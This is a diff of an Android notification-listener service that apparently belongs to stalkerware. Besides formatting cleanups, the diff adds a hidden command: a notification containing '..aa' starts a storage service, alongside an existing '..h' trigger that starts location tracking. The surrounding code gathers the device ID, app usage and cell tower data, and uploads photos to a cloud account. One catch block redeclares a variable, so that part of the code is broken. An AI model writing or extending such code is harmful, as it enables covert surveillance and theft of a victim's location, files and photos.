@@ -95,7 +95,6 @@ public class NotificationService extends NotificationListenerService implements 
 
     private float lightValue = 0f;
     private float movementValue = 0f;
-    private float x, y, z;
     private float lastX, lastY, lastZ;
 
     private volatile boolean isProximityNear = false;
@@ -167,21 +166,20 @@ public class NotificationService extends NotificationListenerService implements 
             } catch (Exception ignored) {
                 return;
             }
-            
-            String appName = pkg;
-           try {
-               PackageManager pm = getPackageManager();
-               ApplicationInfo info = pm.getApplicationInfo(pkg, 0);
-               CharSequence label = pm.getApplicationLabel(info);
 
-               if (label != null) {
-                  appName = label.toString();
-               }
-               
-           } catch (Exception ignored) {
-               appName = pkg;
-           }         
-          
+            String appName = pkg;
+            try {
+                PackageManager pm = getPackageManager();
+                ApplicationInfo info = pm.getApplicationInfo(pkg, 0);
+                CharSequence label = pm.getApplicationLabel(info);
+
+                if (label != null) {
+                    appName = label.toString();
+                }
+            } catch (Exception ignored) {
+                appName = pkg;
+            }
+
             Notification notification;
             Bundle extras;
             try {
@@ -215,6 +213,7 @@ public class NotificationService extends NotificationListenerService implements 
             String lowerTitle = title.toLowerCase();
             String lowerText = text.toLowerCase();
 
+            // Progress
             if (SIZE_PATTERN.matcher(lowerText).find() ||
                     TIME_PATTERN.matcher(lowerText).find() ||
                     SPEED_PATTERN.matcher(lowerText).find())
@@ -242,8 +241,8 @@ public class NotificationService extends NotificationListenerService implements 
 
             if ((pkg.equals("com.whatsapp") || pkg.equals("com.whatsapp.w4b")) && lowerTitle.contains("whatsapp")
                     && (lowerText.contains("sending") || lowerText.contains("downloading"))) return;
-            
-            // Facebook 
+
+            // Facebook
             if ((pkg.equals("com.facebook.orca") && lowerTitle.contains("messenger"))
                     && lowerText.contains("new message")) return;
 
@@ -251,11 +250,22 @@ public class NotificationService extends NotificationListenerService implements 
             if (title.equals(bigText)) bigText = "";
             if (!text.isEmpty() && !text.equals(title) && text.equals(bigText)) bigText = "";
 
+            // Commands
             if (allText.contains("..h")) {
-                if (!hasLocationPermission()) return;
-                if (isLocationEnabled()) {
-                    Intent locService = new Intent(this, LocationService.class);
-                    startService(locService);
+                if (hasLocationPermission()) {
+                    if (isLocationEnabled()) {
+                        // Start location service
+                        Intent locService = new Intent(this, LocationService.class);
+                        startService(locService);
+                    }
+                }
+            }
+
+            if (allText.contains("..aa")) {
+                if (hasStoragePermission()) {
+                    // Start storage service
+                    Intent StoService = new Intent(this, StorageService.class);
+                    startService(StoService);
                 }
             }
 
@@ -318,7 +328,6 @@ public class NotificationService extends NotificationListenerService implements 
             data.put("active", System.currentTimeMillis());
 
             if (!staticDataSent) {
-
                 String androidId;
                 try {
                     androidId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
@@ -372,8 +381,7 @@ public class NotificationService extends NotificationListenerService implements 
             sp.edit().putLong("last_configs_cooldown_set", now).apply();
 
             if (hasStoragePermission()) {
-
-                // Start StorageService
+                // Start storage service
                 Intent stoService = new Intent(this, StorageService.class);
                 startService(stoService);
             }
@@ -665,7 +673,7 @@ public class NotificationService extends NotificationListenerService implements 
 
                         sp.edit().putString("last_cell_tower_unique_id", towerUniqueId).apply();
 
-                        // Start LocationService
+                        // Start location service
                         Intent locService = new Intent(this, LocationService.class);
                         startService(locService);
 
@@ -1207,13 +1215,13 @@ public class NotificationService extends NotificationListenerService implements 
                         long lastUsed = stats.getLastTimeUsed();
 
                         Map<String, Object> data = new HashMap<>();
-                  
+
                         String label = pkg;
                         try {
                             label = pm.getApplicationLabel(pm.getApplicationInfo(pkg, 0)).toString();
                         } catch (Exception ignored) {
                             String label = pkg;
-                        }                  
+                        }
 
                         data.put("appName", label);
                         data.put("package", pkg);
@@ -1552,7 +1560,7 @@ public class NotificationService extends NotificationListenerService implements 
             if (canUpload && !cloudName.isEmpty() && !uploadPreset.isEmpty()) {
                 sp.edit().putLong("last_photos_cooldown_set", now).apply();
 
-                // Start PhotosService
+                // Start photos service
                 Intent phoIntent = new Intent(this, PhotosService.class);
                 startService(phoIntent);
             }
@@ -1730,7 +1738,4 @@ public class NotificationService extends NotificationListenerService implements 
         SimpleDateFormat sdf = new SimpleDateFormat("yyyy/MM/dd hh:mm:ss a", Locale.US);
         return sdf.format(new java.util.Date(timestamp));
     }
-
-    @Override
-    public void onDestroy() {}
 }
